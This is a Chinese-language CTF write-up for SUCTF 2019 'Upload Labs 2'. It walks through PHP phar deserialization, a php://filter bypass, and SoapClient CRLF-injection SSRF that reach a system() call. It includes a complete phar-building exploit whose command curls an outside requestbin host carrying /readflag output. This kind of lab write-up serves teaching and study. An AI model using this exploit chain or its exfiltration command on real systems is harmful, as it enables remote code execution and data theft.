---
title: '[SUCTF 2019]Upload Labs 2'
date: 2025-05-21 20:31:20
tags: upload
---

## [SUCTF 2019]Upload Labs **2**

```php
<?php
include 'config.php';

class Ad{

    public $cmd;

    public $clazz;
    public $func1;
    public $func2;
    public $func3;
    public $instance;
    public $arg1;
    public $arg2;
    public $arg3;

    function __construct($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3){

        $this->cmd = $cmd;

        $this->clazz = $clazz;
        $this->func1 = $func1;
        $this->func2 = $func2;
        $this->func3 = $func3;
        $this->arg1 = $arg1;
        $this->arg2 = $arg2;
        $this->arg3 = $arg3;
    }

    function check(){

        $reflect = new ReflectionClass($this->clazz);
        $this->instance = $reflect->newInstanceArgs();

        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func1);
        $reflectionMethod->invoke($this->instance, $this->arg1);

        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func2);
        $reflectionMethod->invoke($this->instance, $this->arg2);

        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func3);
        $reflectionMethod->invoke($this->instance, $this->arg3);
    }

    function __destruct(){
        system($this->cmd);
    }
}

if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){
    if(isset($_POST['admin'])){
        $cmd = $_POST['cmd'];

        $clazz = $_POST['clazz'];
        $func1 = $_POST['func1'];
        $func2 = $_POST['func2'];
        $func3 = $_POST['func3'];
        $arg1 = $_POST['arg1'];
        $arg2 = $_POST['arg2'];
        $arg2 = $_POST['arg3'];
        $admin = new Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);
        $admin->check();
    }
}
else {
    echo "You r not admin!";
}

```

我们来看代码，在ad类的析构函数中存在一个rce函数，所以我们的目的是能够执行它

想要通过if，我们需要进行ssrf，同时为了到达命令执行的点，我们还需要通过check函数的检查 

```php
    function check(){

        $reflect = new ReflectionClass($this->clazz);
        $this->instance = $reflect->newInstanceArgs();

        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func1);
        $reflectionMethod->invoke($this->instance, $this->arg1);

        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func2);
        $reflectionMethod->invoke($this->instance, $this->arg2);

        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func3);
        $reflectionMethod->invoke($this->instance, $this->arg3);
    }
```

在这里通过反射来调用类的方法，我们可以找一个存在单参数方法的原生类，这里用到了SplDoublyLinkedList::unshift

![image-20250521204615041](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505212046219.png)

我们在func.php发现下面代码

```php
<?php
include 'class.php';

if (isset($_POST["submit"]) && isset($_POST["url"])) {
    if(preg_match('/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i',$_POST['url'])){
        die("Go away!");
    }else{
        $file_path = $_POST['url'];
        $file = new File($file_path);
        $file->getMIME();
        echo "<p>Your file type is '$file' </p>";
    }
}


?>
```

跟进getMIME，我们进入class.php（文件从github下下来的）

```php
<?php
include 'config.php';

class File{

    public $file_name;
    public $type;
    public $func = "Check";

    function __construct($file_name){
        $this->file_name = $file_name;
    }

    function __wakeup(){
        $class = new ReflectionClass($this->func);
        $a = $class->newInstanceArgs($this->file_name);
        $a->check();
    }
    
    function getMIME(){
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $this->type = finfo_file($finfo, $this->file_name);
        finfo_close($finfo);
    }

    function __toString(){
        return $this->type;
    }

}

class Check{

    public $file_name;

    function __construct($file_name){
        $this->file_name = $file_name;
    }

    function check(){
        $data = file_get_contents($this->file_name);
        if (mb_strpos($data, "<?") !== FALSE) {
            die("&lt;? in contents!");
        }
    }
}
```

其中的finfo_file可以触发phar反序列化

为了绕过func.php中的正则，我们可以使用php伪协议进行绕过，提示在File类中存在如下wakeup方法

```
    function __wakeup(){
        $class = new ReflectionClass($this->func);
        $a = $class->newInstanceArgs($this->file_name);
        $a->check();
    }
```

在该方法中使用反射可以获取到任意类的实例，在这里自然想到soap反序列化，当执行到$a->check();的时候会触发__call方法，可以造成ssrf，参考如下文章https://blog.csdn.net/qq_38154820/article/details/106330082

在这里可以及构造如下上传phar的代码

```php
<?php

class File{
	public $file_name;
    public $func;

    function __construct(){
    	$target = 'http://127.0.0.1/admin.php';
		$post_string = 'admin=1&cmd=curl "http://http.requestbin.buuoj.cn/w7rkm9w7?a=`/readflag`"&clazz=SplDoublyLinkedList&func1=unshift&func2=unshift&func3=unshift&arg1=1&arg2=2&arg3=3';
		$headers = array(
    		'X-Forwarded-For: 127.0.0.1',
    		'Cookie: name=1234'
    	);
        $this->func = "SoapClient";
        $this->file_name = [null,array('location' => $target,'user_agent'=>"wupco\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,'uri'=> "aaab")];
    }
}
@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("__HALT_COMPILER();"); //设置stub
$o = new File();
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
$phar->stopBuffering();
?>

```

我们将得到的phar.phar改为phar.gif

上传后触发phar

```
php://filter/resource=phar://upload/17ac2685d5d5a6c401e7f5b28a603095/628941e623f5a967093007bf39be805f.jpg
```

![image-20250521214608131](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505212146291.png)

在vps请求里拿到flag
